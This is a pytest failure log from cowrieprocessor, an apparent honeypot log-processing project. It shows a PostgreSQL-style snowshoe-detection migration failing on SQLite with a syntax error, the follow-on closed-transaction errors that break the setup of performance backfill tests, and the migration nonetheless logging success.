2025-10-18 17:42:16,947:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:16,948:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:16,948:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:16,955:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:16,955:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:16,957:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:16,957:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:16,958:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:16,958:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:16,962:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:16,962:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:16,963:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:16,963:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:16,964:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:16,964:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:16,968:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:16,968:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:16,969:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:16,969:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:16,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:16,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:16,971:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:16,971:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:16,974:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:16,974:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:16,975:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:16,975:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:16,976:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,976:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,977:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,977:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,978:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,978:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,978:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,978:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,981:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,981:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:16,981:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:42:16,981:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__ ERROR at setup of TestFilesBackfillPerformance.test_memory_usage_stability __

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_memory_usage_stability0')

    @pytest.fixture
    def performance_engine(tmp_path):
        """Create database engine optimized for performance testing."""
        db_path = tmp_path / "perf_test.db"
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/performance/test_files_backfill.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b3126270>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:42:20,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:20,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:20,023:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:20,023:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:20,031:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:20,031:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:20,032:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:20,032:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:42:20,034:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:20,034:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:42:20,036:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:20,036:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:42:20,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:20,039:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:20,040:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:20,040:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:20,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:20,041:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:20,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:20,043:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:20,046:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:20,046:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:20,047:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:20,047:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:20,048:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:20,048:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:20,048:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:20,048:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:20,050:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,050:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,052:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,053:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,053:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,053:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,053:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:20,054:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:42:20,054:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestFilesBackfillPerformance.test_batch_size_optimization __

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_batch_size_optimization0')

    @pytest.fixture
    def performance_engine(tmp_path):
        """Create database engine optimized for performance testing."""
        db_path = tmp_path / "perf_test.db"
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/performance/test_files_backfill.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2aa4c90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:42:23,054:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:23,054:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:42:23,055:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:23,055:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:42:23,063:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:23,063:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:42:23,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
